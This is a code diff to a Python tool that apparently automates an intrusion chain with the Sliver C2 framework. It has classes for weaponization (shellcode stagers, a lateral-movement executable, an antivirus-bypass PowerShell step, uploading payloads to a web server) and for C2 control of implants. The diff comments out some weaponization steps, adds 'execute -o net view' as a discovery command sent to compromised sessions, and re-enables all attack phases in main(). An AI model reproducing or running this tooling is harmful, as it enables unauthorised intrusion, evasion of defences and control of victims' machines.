@@ -115,7 +115,7 @@ class weaponization:
         print(self)
 
         self.temp_shellcode_path = "./data/payloads/win_stager.c"
-        self.payload_forlateral_movement = "./data/payloads/entitled_kilt"
+        self.payload_for_lateral_movement = "./data/payloads/ENTITLED_KILT.exe"
         self.payload_template = "tools/sliver/payload_template.ps1"
         self.public_server_path = os.getenv("WEB_STAGER_PATH")
         self.public_payload_name = os.getenv("PAYLOAD_PS1")
@@ -125,14 +125,14 @@ class weaponization:
         self.shellcode = None
         self.payload = None
 
-        data_in_shellcode_file = self.create_shellcode(self.temp_shellcode_path)
-        data_in_payload_file = self.load_payload_template(self.payload_template)
-        data_payload_for_lateral_movement = self.create_payload_for_lateral_movement(self.payload_forlateral_movement)
+        # # data_in_shellcode_file = self.create_shellcode(self.temp_shellcode_path)
+        # data_in_payload_file = self.load_payload_template(self.payload_template)
+        data_payload_for_lateral_movement = self.create_payload_for_lateral_movement(self.payload_for_lateral_movement)
 
-        self.update_shellcode_in_payload(data_in_shellcode_file, data_in_payload_file)
-        self.upload_to_website(self.payload_path)
-        self.ps_srcipt_for_bypass_av(self.public_server_path, self.fish, self.public_payload_name)
-        self.clear_phase()
+        # self.update_shellcode_in_payload(data_in_shellcode_file, data_in_payload_file)
+        # self.upload_to_website(self.payload_path)
+        # self.ps_srcipt_for_bypass_av(self.public_server_path, self.fish, self.public_payload_name)
+        # self.clear_phase()
 
         print('\n')
     
@@ -190,13 +190,15 @@ class weaponization:
             print(f"An error occurred while loading the payload template: {e}")
             return ""
 
-    def create_payload_for_lateral_movement(self, file_path="./data/payloads/entitled_kilt"):
+    def create_payload_for_lateral_movement(self, file_path="./data/payloads/ENTITLED_KILT.exe"):
         script_path = "./tools/sliver/create_payload_for_lateral_movement.sh"
 
         # Check if file_path exists and delete if it does
-        full_file_name = file_path+".exe"
-        if os.path.exists(full_file_name):
-            os.remove(full_file_name)
+        # full_file_name = file_path+".exe"
+        # if os.path.exists(full_file_name):
+        #     os.remove(full_file_name)
+        if os.path.exists(file_path):
+            os.remove(file_path)
             print(f"Old payload at {file_path} has been deleted.")
 
         # Call the function to run the shell script
@@ -313,6 +315,7 @@ class installation:
 class c2:
     def __init__(self) -> None:
         self.ids = []
+        self.outstring = None
         self.is_gather = False
         print(self)
 
@@ -402,6 +405,7 @@ class c2:
                     commands = [
                         f"use {self.ids[-1]}\n",
                         "info\n",
+                        "execute -o net view\n",
                         "background\n"
                     ]
                     # Send commands to the sliver-server process
@@ -423,6 +427,8 @@ class c2:
 
             # handle
             intro(self)
+
+            gather_thread.join()
 
         except subprocess.CalledProcessError as e:
             print(f"Error executing sliver-server command: {e}")
@@ -449,12 +455,12 @@ class c2:
 
 def main():
     list_phase = []
-    # list_phase.append(reconaissance())
+    list_phase.append(reconaissance())
     list_phase.append(weaponization())
-    # list_phase.append(delivery())
-    # list_phase.append(exploitation())
-    # list_phase.append(installation())
-    # list_phase.append(c2())
+    list_phase.append(delivery())
+    list_phase.append(exploitation())
+    list_phase.append(installation())
+    list_phase.append(c2())
 
 if __name__ == '__main__':
     main()
